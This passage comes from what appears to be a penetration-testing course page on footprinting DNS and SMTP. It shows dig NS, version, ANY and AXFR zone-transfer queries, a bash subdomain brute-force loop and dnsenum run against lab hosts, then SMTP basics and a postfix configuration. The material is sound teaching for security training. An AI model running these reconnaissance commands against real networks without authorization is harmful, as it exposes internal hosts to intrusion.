<td>Collects statistical data of zones.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>The footprinting at DNS servers is done as a result of the requests we send. So, first of all, the DNS server can be queried as to which other name servers are known. We do this using the NS record and the specification of the DNS server we want to query using the <code>@</code> character. This is because if there are other DNS servers, we can also use them and query the records. However, other DNS servers may be configured differently and, in addition, may be permanent for other zones.</p>
<p><strong>DIG - NS Query</strong></p>
<p>DNS</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ dig ns inlanefreight.htb @<span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span>

; &lt;&lt;&gt;&gt; <span class="hljs-selector-tag">DiG</span> 9<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.1-Ubuntu</span> &lt;&lt;&gt;&gt; <span class="hljs-selector-tag">ns</span> <span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.htb</span> @<span class="hljs-keyword">10</span>.<span class="hljs-keyword">129</span>.<span class="hljs-keyword">14</span>.<span class="hljs-keyword">128</span>
;; <span class="hljs-selector-tag">global</span> <span class="hljs-selector-tag">options</span>: +<span class="hljs-selector-tag">cmd</span>
;; <span class="hljs-selector-tag">Got</span> <span class="hljs-selector-tag">answer</span>:
;; <span class="hljs-selector-tag">-</span>&gt;&gt;<span class="hljs-selector-tag">HEADER</span>&lt;&lt;<span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">opcode</span>: <span class="hljs-selector-tag">QUERY</span>, <span class="hljs-selector-tag">status</span>: <span class="hljs-selector-tag">NOERROR</span>, <span class="hljs-selector-tag">id</span>: 45010
;; <span class="hljs-selector-tag">flags</span>: <span class="hljs-selector-tag">qr</span> <span class="hljs-selector-tag">aa</span> <span class="hljs-selector-tag">rd</span> <span class="hljs-selector-tag">ra</span>; <span class="hljs-selector-tag">QUERY</span>: 1, <span class="hljs-selector-tag">ANSWER</span>: 1, <span class="hljs-selector-tag">AUTHORITY</span>: 0, <span class="hljs-selector-tag">ADDITIONAL</span>: 2

;; <span class="hljs-selector-tag">OPT</span> <span class="hljs-selector-tag">PSEUDOSECTION</span>:
; <span class="hljs-selector-tag">EDNS</span>: <span class="hljs-selector-tag">version</span>: 0, <span class="hljs-selector-tag">flags</span>:; <span class="hljs-selector-tag">udp</span>: 4096
; <span class="hljs-selector-tag">COOKIE</span>: <span class="hljs-selector-tag">ce4d8681b32abaea0100000061475f73842c401c391690c7</span> (<span class="hljs-selector-tag">good</span>)
;; <span class="hljs-selector-tag">QUESTION</span> <span class="hljs-selector-tag">SECTION</span>:
;<span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.htb</span>.             <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">NS</span>

;; <span class="hljs-selector-tag">ANSWER</span> <span class="hljs-selector-tag">SECTION</span>:
<span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.htb</span>.      604800  <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">NS</span>      <span class="hljs-selector-tag">ns</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.htb</span>.

;; <span class="hljs-selector-tag">ADDITIONAL</span> <span class="hljs-selector-tag">SECTION</span>:
<span class="hljs-selector-tag">ns</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.htb</span>.   604800  <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">A</span>       10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.34</span><span class="hljs-selector-class">.136</span>

;; <span class="hljs-selector-tag">Query</span> <span class="hljs-selector-tag">time</span>: 0 <span class="hljs-selector-tag">msec</span>
;; <span class="hljs-selector-tag">SERVER</span>: 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.128</span><span class="hljs-selector-id">#53</span>(10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.128</span>)
;; <span class="hljs-selector-tag">WHEN</span>: <span class="hljs-selector-tag">So</span> <span class="hljs-selector-tag">Sep</span> 19 18<span class="hljs-selector-pseudo">:04</span><span class="hljs-selector-pseudo">:03</span> <span class="hljs-selector-tag">CEST</span> 2021
;; <span class="hljs-selector-tag">MSG</span> <span class="hljs-selector-tag">SIZE</span>  <span class="hljs-selector-tag">rcvd</span>: 107
</code></pre>
<p>Sometimes it is also possible to query a DNS server&#39;s version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server. For this, we could use the following command:</p>
<p><strong>DIG - Version Query</strong></p>
<p>DNS</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ dig CH TXT version.bind <span class="hljs-number">10.129</span>.<span class="hljs-number">120.85</span>

; &lt;&lt;&gt;&gt; <span class="hljs-selector-tag">DiG</span> 9<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.6</span> &lt;&lt;&gt;&gt; <span class="hljs-selector-tag">CH</span> <span class="hljs-selector-tag">TXT</span> <span class="hljs-selector-tag">version</span><span class="hljs-selector-class">.bind</span>
;; <span class="hljs-selector-tag">global</span> <span class="hljs-selector-tag">options</span>: +<span class="hljs-selector-tag">cmd</span>
;; <span class="hljs-selector-tag">Got</span> <span class="hljs-selector-tag">answer</span>:
;; <span class="hljs-selector-tag">-</span>&gt;&gt;<span class="hljs-selector-tag">HEADER</span>&lt;&lt;<span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">opcode</span>: <span class="hljs-selector-tag">QUERY</span>, <span class="hljs-selector-tag">status</span>: <span class="hljs-selector-tag">NOERROR</span>, <span class="hljs-selector-tag">id</span>: 47786
;; <span class="hljs-selector-tag">flags</span>: <span class="hljs-selector-tag">qr</span> <span class="hljs-selector-tag">aa</span> <span class="hljs-selector-tag">rd</span>; <span class="hljs-selector-tag">QUERY</span>: 1, <span class="hljs-selector-tag">ANSWER</span>: 1, <span class="hljs-selector-tag">AUTHORITY</span>: 0, <span class="hljs-selector-tag">ADDITIONAL</span>: 1

;; <span class="hljs-selector-tag">ANSWER</span> <span class="hljs-selector-tag">SECTION</span>:
<span class="hljs-selector-tag">version</span><span class="hljs-selector-class">.bind</span>.       0       <span class="hljs-selector-tag">CH</span>      <span class="hljs-selector-tag">TXT</span>     "9<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.6-P1</span>"

;; <span class="hljs-selector-tag">ADDITIONAL</span> <span class="hljs-selector-tag">SECTION</span>:
<span class="hljs-selector-tag">version</span><span class="hljs-selector-class">.bind</span>.       0       <span class="hljs-selector-tag">CH</span>      <span class="hljs-selector-tag">TXT</span>     "9<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.6-P1-Debian</span>"

;; <span class="hljs-selector-tag">Query</span> <span class="hljs-selector-tag">time</span>: 2 <span class="hljs-selector-tag">msec</span>
;; <span class="hljs-selector-tag">SERVER</span>: 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.120</span><span class="hljs-selector-class">.85</span><span class="hljs-selector-id">#53</span>(10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.120</span><span class="hljs-selector-class">.85</span>)
;; <span class="hljs-selector-tag">WHEN</span>: <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Jan</span> 05 20<span class="hljs-selector-pseudo">:23</span><span class="hljs-selector-pseudo">:14</span> <span class="hljs-selector-tag">UTC</span> 2023
;; <span class="hljs-selector-tag">MSG</span> <span class="hljs-selector-tag">SIZE</span>  <span class="hljs-selector-tag">rcvd</span>: 101
</code></pre>
<p>We can use the option <code>ANY</code> to view all available records. This will cause the server to show us all available entries that it is willing to disclose. It is important to note that not all entries from the zones will be shown.</p>
<p><strong>DIG - ANY Query</strong></p>
<p>DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ dig any inlanefreight.htb @<span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span>

; &lt;&lt;&gt;&gt; DiG 9<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.1-Ubuntu</span> &lt;&lt;&gt;&gt; any inlanefreight<span class="hljs-selector-class">.htb</span> @<span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span>
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;<span class="hljs-selector-tag">HEADER</span>&lt;&lt;- opcode: QUERY, status: NOERROR, id: <span class="hljs-number">7649</span>
;; flags: qr aa rd ra; QUERY: <span class="hljs-number">1</span>, ANSWER: <span class="hljs-number">5</span>, AUTHORITY: <span class="hljs-number">0</span>, ADDITIONAL: <span class="hljs-number">2</span>

;; OPT PSEUDOSECTION:
; EDNS: version: <span class="hljs-number">0</span>, flags:; udp: <span class="hljs-number">4096</span>
; COOKIE: <span class="hljs-number">064</span>b7e1f091b95120100000061476865a6026d01f87d10ca (good)
;; QUESTION <span class="hljs-selector-tag">SECTION</span>:
;inlanefreight<span class="hljs-selector-class">.htb</span>.             IN      ANY

;; ANSWER <span class="hljs-selector-tag">SECTION</span>:
inlanefreight.htb.      <span class="hljs-number">604800</span>  IN      TXT     <span class="hljs-string">"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"</span>
inlanefreight.htb.      <span class="hljs-number">604800</span>  IN      TXT     <span class="hljs-string">"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"</span>
inlanefreight.htb.      <span class="hljs-number">604800</span>  IN      TXT     <span class="hljs-string">"MS=ms97310371"</span>
inlanefreight.htb.      <span class="hljs-number">604800</span>  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. <span class="hljs-number">2</span> <span class="hljs-number">604800</span> <span class="hljs-number">86400</span> <span class="hljs-number">2419200</span> <span class="hljs-number">604800</span>
inlanefreight.htb.      <span class="hljs-number">604800</span>  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL <span class="hljs-selector-tag">SECTION</span>:
ns.inlanefreight.htb.   <span class="hljs-number">604800</span>  IN      A       <span class="hljs-number">10.129</span>.<span class="hljs-number">34.136</span>

;; Query <span class="hljs-selector-tag">time</span>: <span class="hljs-number">0</span> msec
;; SERVER: <span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span><span class="hljs-number">#53</span>(<span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span>)
;; WHEN: So Sep <span class="hljs-number">19</span> <span class="hljs-number">18</span>:<span class="hljs-number">42</span>:<span class="hljs-number">13</span> CEST <span class="hljs-number">2021</span>
;; MSG SIZE  rcvd: <span class="hljs-number">437</span>
</code></pre>
<p><code>Zone transfer</code> refers to the transfer of zones to another server in DNS, which generally happens over TCP port 53. This procedure is abbreviated <code>Asynchronous Full Transfer Zone</code> (<code>AXFR</code>). Since a DNS failure usually has severe consequences for a company, the zone file is almost invariably kept identical on several name servers. When changes are made, it must be ensured that all servers have the same data. Synchronization between the servers involved is realized by zone transfer. Using a secret key <code>rndc-key</code>, which we have seen initially in the default configuration, the servers make sure that they communicate with their own master or slave. Zone transfer involves the mere transfer of files or records and the detection of discrepancies in the data sets of the servers involved.</p>
<p>The original data of a zone is located on a DNS server, which is called the <code>primary</code> name server for this zone. However, to increase the reliability, realize a simple load distribution, or protect the primary from attacks, one or more additional servers are installed in practice in almost all cases, which are called <code>secondary</code> name servers for this zone. For some <code>Top-Level Domains</code> (<code>TLDs</code>), making zone files for the <code>Second Level Domains</code> accessible on at least two servers is mandatory.</p>
<p>DNS entries are generally only created, modified, or deleted on the primary. This can be done by manually editing the relevant zone file or automatically by a dynamic update from a database. A DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master is called a slave. A primary is always a master, while a secondary can be both a slave and a master.</p>
<p>The slave fetches the <code>SOA</code> record of the relevant zone from the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA record of the master is greater than that of the slave, the data sets no longer match.</p>
<p><strong>DIG - AXFR Zone Transfer</strong></p>
<p>DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ dig axfr inlanefreight.htb @<span class="hljs-number">10.129.14.128</span>

<span class="hljs-comment">; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; axfr inlanefreight.htb @10.129.14.128</span>
<span class="hljs-comment">;; global options: +cmd</span>
inlanefreight.htb.      <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">SOA</span>     inlanefreight.htb. root.inlanefreight.htb. <span class="hljs-number">2 604800</span> <span class="hljs-number">86400 2419200</span> <span class="hljs-number">604800</span>
inlanefreight.htb.      <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">TXT</span>     "MS=ms<span class="hljs-number">97310371</span>"
inlanefreight.htb.      <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">TXT</span>     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">TXT</span>     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip<span class="hljs-number">4:10.129.124</span>.<span class="hljs-number">8</span> ip<span class="hljs-number">4:10.129.127</span>.<span class="hljs-number">2</span> ip<span class="hljs-number">4:10.129.42</span>.<span class="hljs-number">106</span> ~all"
inlanefreight.htb.      <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">NS</span>      ns.inlanefreight.htb.
app.inlanefreight.htb.  <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.18.15</span>
internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span>   <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.1.6</span>
mail1.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.18.201</span>
ns.inlanefreight.htb.   <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.34.136</span>
inlanefreight.htb.      <span class="hljs-number">604800</span>  <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">SOA</span>     inlanefreight.htb. root.inlanefreight.htb. <span class="hljs-number">2 604800</span> <span class="hljs-number">86400 2419200</span> <span class="hljs-number">604800</span>
<span class="hljs-comment">;; Query time: 4 msec</span>
<span class="hljs-comment">;; SERVER: 10.129.14.128#53(10.129.14.128)</span>
<span class="hljs-comment">;; WHEN: So Sep 19 18:51:19 CEST 2021</span>
<span class="hljs-comment">;; XFR size: 9 records (messages 1, bytes 520)</span>
</code></pre>
<p>If the administrator used a subnet for the <code>allow-transfer</code> option for testing purposes or as a workaround solution or set it to <code>any</code>, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames.</p>
<p><strong>DIG - AXFR Zone Transfer - Internal</strong></p>
<p>DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ dig axfr internal.inlanefreight.htb @<span class="hljs-number">10.129.14.128</span>

<span class="hljs-comment">; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; axfr internal.inlanefreight.htb @10.129.14.128</span>
<span class="hljs-comment">;; global options: +cmd</span>
internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span>   <span class="hljs-keyword">SOA</span>     inlanefreight.htb. root.inlanefreight.htb. <span class="hljs-number">2 604800</span> <span class="hljs-number">86400 2419200</span> <span class="hljs-number">604800</span>
internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span>   <span class="hljs-keyword">TXT</span>     "MS=ms<span class="hljs-number">97310371</span>"
internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span>   <span class="hljs-keyword">TXT</span>     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span>   <span class="hljs-keyword">TXT</span>     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip<span class="hljs-number">4:10.129.124</span>.<span class="hljs-number">8</span> ip<span class="hljs-number">4:10.129.127</span>.<span class="hljs-number">2</span> ip<span class="hljs-number">4:10.129.42</span>.<span class="hljs-number">106</span> ~all"
internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span>   <span class="hljs-keyword">NS</span>      ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span>     <span class="hljs-number">10.129.34.16</span>
dc2.internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span>     <span class="hljs-number">10.129.34.11</span>
mail1.internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span>   <span class="hljs-number">10.129.18.200</span>
ns.internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span>      <span class="hljs-number">10.129.34.136</span>
vpn.internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span>     <span class="hljs-number">10.129.1.6</span>
ws1.internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span>     <span class="hljs-number">10.129.1.34</span>
ws2.internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span>     <span class="hljs-number">10.129.1.35</span>
wsus.internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span>    <span class="hljs-number">10.129.18.2</span>
internal.inlanefreight.htb. <span class="hljs-number">604800</span> <span class="hljs-keyword">IN</span>   <span class="hljs-keyword">SOA</span>     inlanefreight.htb. root.inlanefreight.htb. <span class="hljs-number">2 604800</span> <span class="hljs-number">86400 2419200</span> <span class="hljs-number">604800</span>
<span class="hljs-comment">;; Query time: 0 msec</span>
<span class="hljs-comment">;; SERVER: 10.129.14.128#53(10.129.14.128)</span>
<span class="hljs-comment">;; WHEN: So Sep 19 18:53:11 CEST 2021</span>
<span class="hljs-comment">;; XFR size: 15 records (messages 1, bytes 664)</span>
</code></pre>
<p>The individual <code>A</code> records with the hostnames can also be found out with the help of a brute-force attack. To do this, we need a list of possible hostnames, which we use to send the requests in order. Such lists are provided, for example, by <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt">SecLists</a>.</p>
<p>An option would be to execute a <code>for-loop</code> in Bash that lists these entries and sends the corresponding query to the desired DNS server.</p>
<p><strong>Subdomain Brute Forcing</strong></p>
<p>DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-110000.</span>txt);do dig $sub.inlanefreight.htb @<span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

ns.inlanefreight.htb.   <span class="hljs-number">604800</span>  IN      A       <span class="hljs-number">10.129</span><span class="hljs-number">.34</span><span class="hljs-number">.136</span>
mail1.inlanefreight.htb. <span class="hljs-number">604800</span> IN      A       <span class="hljs-number">10.129</span><span class="hljs-number">.18</span><span class="hljs-number">.201</span>
app.inlanefreight.htb.  <span class="hljs-number">604800</span>  IN      A       <span class="hljs-number">10.129</span><span class="hljs-number">.18</span><span class="hljs-number">.15</span>
</code></pre>
<p>Many different tools can be used for this, and most of them work in the same way. One of these tools is, for example <a href="https://github.com/fwaeytens/dnsenum">DNSenum</a>.</p>
<p>DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb

dnsenum VERSION:1.2.6

-----   inlanefreight.htb   -----


Host's addresses:
<span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-emphasis">___</span>



Name Servers:
<span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-emphasis">___</span>_

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136


Mail (MX) Servers:
<span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-emphasis">___</span>_



Trying Zone Transfers and getting Bind Versions:
<span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-emphasis">___</span>_

unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 1.

Trying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ...
AXFR record query failed: no nameservers


Brute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:
<span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-strong">_____</span><span class="hljs-emphasis">___</span>

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136
mail1.inlanefreight.htb.                 604800   IN    A        10.129.18.201
app.inlanefreight.htb.                   604800   IN    A        10.129.18.15
ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136

...SNIP...
done.
</code></pre>
<h2 id="smtp">SMTP</h2>
<hr>
<p>The <code>Simple Mail Transfer Protocol</code> (<code>SMTP</code>) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers. In this case, a server effectively acts as a client.</p>
<p>By default, SMTP servers accept connection requests on port <code>25</code>. However, newer SMTP servers also use other ports such as TCP port <code>587</code>. This port is used to receive mail from authenticated users/servers, usually using the STARTTLS command to switch the existing plaintext connection to an encrypted connection. The authentication data is protected and no longer visible in plaintext over the network. At the beginning of the connection, authentication occurs when the client confirms its identity with a user name and password. The emails can then be transmitted. For this purpose, the client sends the server sender and recipient addresses, the email&#39;s content, and other information and parameters. After the email has been transmitted, the connection is terminated again. The email server then starts sending the email to another SMTP server.</p>
<p>SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port <code>25</code> for the encrypted connection, for example, TCP port <code>465</code>.</p>
<p>An essential function of an SMTP server is preventing spam using authentication mechanisms that allow only authorized users to send e-mails. For this purpose, most modern SMTP servers support the protocol extension ESMTP with SMTP-Auth. After sending his e-mail, the SMTP client, also known as <code>Mail User Agent</code> (<code>MUA</code>), converts it into a header and a body and uploads both to the SMTP server. This has a so-called <code>Mail Transfer Agent</code> (<code>MTA</code>), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a <code>Mail Submission Agent</code> (<code>MSA</code>), which checks the validity, i.e., the origin of the e-mail. This <code>MSA</code> is also called <code>Relay</code> server. These are very important later on, as the so-called <code>Open Relay Attack</code> can be carried out on many SMTP servers due to incorrect configuration. We will discuss this attack and how to identify the weak point for it a little later. The MTA then searches the DNS for the IP address of the recipient mail server.</p>
<p>On arrival at the destination SMTP server, the data packets are reassembled to form a complete e-mail. From there, the <code>Mail delivery agent</code> (<code>MDA</code>) transfers it to the recipient&#39;s mailbox.</p>
<table>
<thead>
<tr>
<th>Client (<code>MUA</code>)</th>
<th><code></code></th>
<th>Submission Agent (<code>MSA</code>)</th>
<th><code></code></th>
<th>Open Relay (<code>MTA</code>)</th>
<th><code></code></th>
<th>Mail Delivery Agent (<code>MDA</code>)</th>
<th><code></code></th>
<th>Mailbox (<code>POP3</code>/<code>IMAP</code>)</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>But SMTP has two disadvantages inherent to the network protocol.</p>
<ol>
<li>The first is that sending an email using SMTP does not return a usable delivery confirmation. Although the specifications of the protocol provide for this type of notification, its formatting is not specified by default, so that usually only an English-language error message, including the header of the undelivered message, is returned.</li>
<li>Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable. As a result, open SMTP relays are often misused to send spam en masse. The originators use arbitrary fake sender addresses for this purpose to not be traced (mail spoofing). Today, many different security techniques are used to prevent the misuse of SMTP servers. For example, suspicious emails are rejected or moved to quarantine (spam folder). For example, responsible for this are the identification protocol <a href="http://dkim.org/">DomainKeys</a> (<code>DKIM</code>), the <a href="https://dmarcian.com/what-is-spf/">Sender Policy Framework</a> (<code>SPF</code>).</li>
</ol>
<p>For this purpose, an extension for SMTP has been developed called <code>Extended SMTP</code> (<code>ESMTP</code>). When people talk about SMTP in general, they usually mean ESMTP. ESMTP uses TLS, which is done after the <code>EHLO</code> command by sending <code>STARTTLS</code>. This initializes the SSL-protected SMTP connection, and from this moment on, the entire connection is encrypted, and therefore more or less secure. Now <a href="https://www.samlogic.net/articles/smtp-commands-reference-auth.htm">AUTH PLAIN</a> extension for authentication can also be used safely.</p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>Each SMTP server can be configured in many ways, as can all other services. However, there are differences because the SMTP server is only responsible for sending and forwarding emails.</p>
<p><strong>Default Configuration</strong></p>
<p>SMTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/postfix/main.cf | grep -v <span class="hljs-string">"#"</span> | sed -r <span class="hljs-string">"/^\s*$/d"</span>

<span class="hljs-attr">smtpd_banner</span> = ESMTP Server 
<span class="hljs-attr">biff</span> = no
<span class="hljs-attr">append_dot_mydomain</span> = no
<span class="hljs-attr">readme_directory</span> = no
<span class="hljs-attr">compatibility_level</span> = <span class="hljs-number">2</span>
<span class="hljs-attr">smtp_tls_session_cache_database</span> = btree:${data_directory}/smtp_scache
<span class="hljs-attr">myhostname</span> = mail1.inlanefreight.htb
<span class="hljs-attr">alias_maps</span> = hash:/etc/aliases
<span class="hljs-attr">alias_database</span> = hash:/etc/aliases
<span class="hljs-attr">smtp_generic_maps</span> = hash:/etc/postfix/generic
<span class="hljs-attr">mydestination</span> = $myhostname, localhost 
<span class="hljs-attr">masquerade_domains</span> = $myhostname
<span class="hljs-attr">mynetworks</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">8</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">16</span>
<span class="hljs-attr">mailbox_size_limit</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">recipient_delimiter</span> = +
<span class="hljs-attr">smtp_bind_address</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>
<span class="hljs-attr">inet_protocols</span> = ipv4
<span class="hljs-attr">smtpd_helo_restrictions</span> = reject_invalid_hostname
<span class="hljs-attr">home_mailbox</span> = /home/postfix
</code></pre>
<p>The sending and communication are also done by special commands that cause the SMTP server to do what the user requires.</p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>AUTH PLAIN</code></td>
<td>AUTH is a service extension used to authenticate the client.</td>
</tr>
<tr>
<td><code>HELO</code></td>
<td>The client logs in with its computer name and thus starts the session.</td>
</tr>
<tr>
<td><code>MAIL FROM</code></td>
<td>The client names the email sender.</td>
</tr>
<tr>
<td><code>RCPT TO</code></td>
<td>The client names the email recipient.</td>
</tr>
<tr>
<td><code>DATA</code></td>
<td>The client initiates the transmission of the email.</td>
</tr>
<tr>
<td><code>RSET</code></td>
<td>The client aborts the initiated transmission but keeps the connection between client and server.</td>
</tr>
<tr>
<td><code>VRFY</code></td>
<td>The client checks if a mailbox is available for message transfer.</td>
</tr>
<tr>
<td><code>EXPN</code></td>
<td>The client also checks if a mailbox is available for messaging with this command.</td>
</tr>
<tr>
<td><code>NOOP</code></td>
<td>The client requests a response from the server to prevent disconnection due to time-out.</td>
</tr>
<tr>
<td><code>QUIT</code></td>
<td>The client terminates the session.</td>
</tr>
</tbody>
</table>
<p>To interact with the SMTP server, we can use the <code>telnet</code> tool to initialize a TCP connection with the SMTP server. The actual initialization of the session is done with the command mentioned above, <code>HELO</code> or <code>EHLO</code>.</p>
<p><strong>Telnet - HELO/EHLO</strong></p>
<p>SMTP</p>
